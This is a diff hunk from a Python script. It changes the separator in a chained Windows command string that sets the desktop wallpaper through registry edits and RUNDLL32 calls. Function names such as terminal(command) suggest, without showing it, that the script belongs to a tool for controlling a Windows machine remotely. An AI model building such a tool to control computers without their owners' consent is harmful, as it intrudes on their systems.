@@ -105,7 +105,7 @@ def terminal(command):
 
 def wallpaper(data):
     importImg(data)
-    severalcmd('reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f §!§RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True §!§reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Imge.jpg'+' /f §!§RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True§!§reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f §!§RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True ')
+    severalcmd('reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f 98!89RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True 98!89reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Imge.jpg'+' /f 98!89RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True98!89reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f 98!89RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True ')
     
 def severalcmd(data, temp=0.05):
     datalist = data.split("98!89")
